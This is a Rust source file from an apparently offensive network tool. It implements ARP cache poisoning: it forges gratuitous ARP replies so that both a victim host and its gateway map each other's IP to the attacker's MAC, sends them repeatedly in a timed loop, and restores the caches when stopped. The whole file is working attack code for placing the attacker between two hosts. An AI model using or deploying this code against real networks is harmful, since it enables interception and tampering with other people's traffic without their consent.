// src/spoofer/poison.rs
use crate::network::packet::ArpRequest;
use pnet::datalink::DataLinkSender;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{Duration, interval};

pub struct PoisonPacket {
    pub target_ip: Ipv4Addr,
    pub target_mac: MacAddr,
    pub spoof_ip: Ipv4Addr, // IP we're claiming (e.g., gateway)
    pub our_mac: MacAddr,   // Our MAC address
}

impl PoisonPacket {
    pub fn to_gratuitous_arp(&self) -> [u8; 42] {
        // Gratuitous ARP: Announce that spoof_ip is at our_mac
        // Target is the victim, but we tell them gateway is at our MAC
        let request = ArpRequest::new(
            self.target_ip, // This is actually not used in reply, but for structure
            self.spoof_ip,  // Sender IP (the IP we're spoofing)
            self.our_mac,   // Sender MAC (our MAC)
        );

        // Modify to be a reply, not request
        let mut bytes = request.to_bytes();

        // Change operation from Request (1) to Reply (2)
        // ARP operation is at offset 20-21 in the full packet (6+2+2+1+1+2 = 14 eth + 6 arp header)
        // Actually in the ARP packet (after eth header), operation is at bytes 6-7
        bytes[20] = 0x00; // High byte
        bytes[21] = 0x02; // Low byte (Reply = 2)

        // Set target MAC to the victim's MAC (unicast, not broadcast)
        bytes[0] = self.target_mac.0;
        bytes[1] = self.target_mac.1;
        bytes[2] = self.target_mac.2;
        bytes[3] = self.target_mac.3;
        bytes[4] = self.target_mac.4;
        bytes[5] = self.target_mac.5;

        bytes
    }

    pub fn to_restore_arp(&self, real_mac: MacAddr) -> [u8; 42] {
        // Send legitimate ARP to restore correct mapping
        let mut bytes = [0u8; 42];

        // Ethernet header
        bytes[0] = self.target_mac.0;
        bytes[1] = self.target_mac.1;
        bytes[2] = self.target_mac.2;
        bytes[3] = self.target_mac.3;
        bytes[4] = self.target_mac.4;
        bytes[5] = self.target_mac.5;
        bytes[6] = self.our_mac.0;
        bytes[7] = self.our_mac.1;
        bytes[8] = self.our_mac.2;
        bytes[9] = self.our_mac.3;
        bytes[10] = self.our_mac.4;
        bytes[11] = self.our_mac.5;
        bytes[12] = 0x08; // EtherType ARP
        bytes[13] = 0x06;

        // ARP header
        bytes[14] = 0x00; // Hardware type Ethernet
        bytes[15] = 0x01;
        bytes[16] = 0x08; // Protocol type IPv4
        bytes[17] = 0x00;
        bytes[18] = 0x06; // HW addr len
        bytes[19] = 0x04; // Proto addr len
        bytes[20] = 0x00; // Operation Reply
        bytes[21] = 0x02;

        // Sender HW addr (real gateway MAC)
        bytes[22] = real_mac.0;
        bytes[23] = real_mac.1;
        bytes[24] = real_mac.2;
        bytes[25] = real_mac.3;
        bytes[26] = real_mac.4;
        bytes[27] = real_mac.5;

        // Sender IP (gateway IP)
        let ip_bytes = self.spoof_ip.octets();
        bytes[28] = ip_bytes[0];
        bytes[29] = ip_bytes[1];
        bytes[30] = ip_bytes[2];
        bytes[31] = ip_bytes[3];

        // Target HW addr
        bytes[32] = self.target_mac.0;
        bytes[33] = self.target_mac.1;
        bytes[34] = self.target_mac.2;
        bytes[35] = self.target_mac.3;
        bytes[36] = self.target_mac.4;
        bytes[37] = self.target_mac.5;

        // Target IP
        let target_ip_bytes = self.target_ip.octets();
        bytes[38] = target_ip_bytes[0];
        bytes[39] = target_ip_bytes[1];
        bytes[40] = target_ip_bytes[2];
        bytes[41] = target_ip_bytes[3];

        bytes
    }
}

pub struct PoisonLoop {
    sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
    our_mac: MacAddr,
    interval: Duration,
}

impl PoisonLoop {
    pub fn new(
        sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
        our_mac: MacAddr,
        interval_ms: u64,
    ) -> Self {
        Self {
            sender,
            our_mac,
            interval: Duration::from_millis(interval_ms),
        }
    }

    pub async fn run(
        &self,
        target: super::SpoofTarget,
        mut stop_rx: tokio::sync::oneshot::Receiver<()>,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let mut interval = interval(self.interval);
        let mut poison_count: u64 = 0;

        // Bidirectional poison packets
        let victim_poison = PoisonPacket {
            target_ip: target.victim_ip,
            target_mac: target.victim_mac,
            spoof_ip: target.gateway_ip,
            our_mac: self.our_mac,
        };

        let gateway_poison = PoisonPacket {
            target_ip: target.gateway_ip,
            target_mac: target.gateway_mac,
            spoof_ip: target.victim_ip,
            our_mac: self.our_mac,
        };

        loop {
            tokio::select! {
                _ = interval.tick() => {
                    // Send bidirectional poisons
                    let v_bytes = victim_poison.to_gratuitous_arp();
                    let g_bytes = gateway_poison.to_gratuitous_arp();

                    {
                        let mut sender = self.sender.lock().await;

                        // Poison victim: tell them gateway is at our MAC
                        match sender.send_to(&v_bytes, None) {
                            Some(Ok(())) => {}
                            Some(Err(e)) => {
                                eprintln!("[!] Failed to poison victim {}: {}", target.victim_ip, e);
                            }
                            None => {
                                return Err("DataLinkSender closed".into());
                            }
                        }

                        // Poison gateway: tell them victim is at our MAC
                        match sender.send_to(&g_bytes, None) {
                            Some(Ok(())) => {}
                            Some(Err(e)) => {
                                eprintln!("[!] Failed to poison gateway for {}: {}", target.victim_ip, e);
                            }
                            None => {
                                return Err("DataLinkSender closed".into());
                            }
                        }
                    }

                    poison_count += 1;
                    if poison_count % 10 == 0 {
                        println!("[*] Poison #{} for host {} (victim: {}, gateway: {})",
                            poison_count, target.host_id, target.victim_ip, target.gateway_ip);
                    }
                }

                _ = &mut stop_rx => {
                    println!("[*] Stopping poison loop for host {}", target.host_id);

                    // Send restore packets to clean up ARP caches
                    self.restore(target, victim_poison, gateway_poison).await?;

                    return Ok(());
                }
            }
        }
    }

    async fn restore(
        &self,
        target: super::SpoofTarget,
        victim_poison: PoisonPacket,
        gateway_poison: PoisonPacket,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        println!("[*] Restoring ARP caches for host {}", target.host_id);

        let mut sender = self.sender.lock().await;

        // Restore victim: tell them real gateway MAC
        let v_restore = victim_poison.to_restore_arp(target.gateway_mac);
        for _ in 0..3 {
            // Send 3 times to ensure receipt
            match sender.send_to(&v_restore, None) {
                Some(Ok(())) => {}
                _ => break,
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        // Restore gateway: tell them real victim MAC
        let g_restore = gateway_poison.to_restore_arp(target.victim_mac);
        for _ in 0..3 {
            match sender.send_to(&g_restore, None) {
                Some(Ok(())) => {}
                _ => break,
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        println!("[+] ARP caches restored for host {}", target.host_id);
        Ok(())
    }
}
